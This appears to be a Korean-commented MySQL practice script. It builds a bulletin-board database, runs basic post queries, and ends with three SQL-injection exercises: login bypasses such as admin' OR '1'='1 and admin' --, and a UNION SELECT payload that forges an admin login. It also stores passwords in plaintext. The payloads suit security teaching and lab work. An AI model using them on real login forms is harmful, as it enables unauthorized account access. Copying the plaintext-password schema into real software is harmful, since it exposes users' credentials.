-- 📌 1️⃣ 데이터베이스 및 테이블 생성
CREATE DATABASE bulletin_board;
USE bulletin_board;

-- 📌 2️⃣ users 테이블 (회원 관리)
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    email VARCHAR(100) NOT NULL UNIQUE,
    password VARCHAR(255) NOT NULL,
    is_admin TINYINT(1) NOT NULL DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- 📌 3️⃣ posts 테이블 (게시판)
CREATE TABLE posts (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    title VARCHAR(255) NOT NULL,
    content TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- 📌 4️⃣ Admin 계정 추가
INSERT INTO users (username, email, password, is_admin) 
VALUES ('admin', 'admin@example.com', 'admin123', 1);

-- 📌 5️⃣ 일반 사용자 계정 추가
INSERT INTO users (username, email, password, is_admin) 
VALUES ('testuser', 'test@example.com', 'password123', 0);

-- 📌 6️⃣ 게시글 작성
INSERT INTO posts (user_id, title, content) 
VALUES (1, '테스트 제목', '테스트 내용');

-- 📌 7️⃣ 게시글 목록 조회
SELECT posts.id, posts.title, users.username, posts.created_at 
FROM posts 
JOIN users ON posts.user_id = users.id 
ORDER BY posts.id DESC;

-- 📌 8️⃣ 게시글 상세 조회
SELECT posts.*, users.username 
FROM posts 
JOIN users ON posts.user_id = users.id 
WHERE posts.id = 1;

-- 📌 9️⃣ 게시글 수정
UPDATE posts 
SET title = '수정된 제목', content = '수정된 내용' 
WHERE id = 1;

-- 📌 🔟 게시글 삭제
DELETE FROM posts WHERE id = 1;

-- 📌 1️⃣1️⃣ SQL 인젝션 실습 (비밀번호 없이 로그인)
-- 아이디 입력: admin' OR '1'='1
-- SQL 변형:
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '아무거나';

-- 📌 1️⃣2️⃣ SQL 인젝션 (관리자 계정 탈취)
-- 아이디 입력: ' UNION SELECT 1, 'admin', 'adminpass', 1 --
-- SQL 변형:
SELECT * FROM users WHERE username = '' UNION SELECT 1, 'admin', 'adminpass', 1 --' AND password = '아무거나';

-- 📌 1️⃣3️⃣ SQL 인젝션 (비밀번호 체크 무력화)
-- 아이디 입력: admin' --
-- SQL 변형:
SELECT * FROM users WHERE username = 'admin' --' AND password = '아무거나';
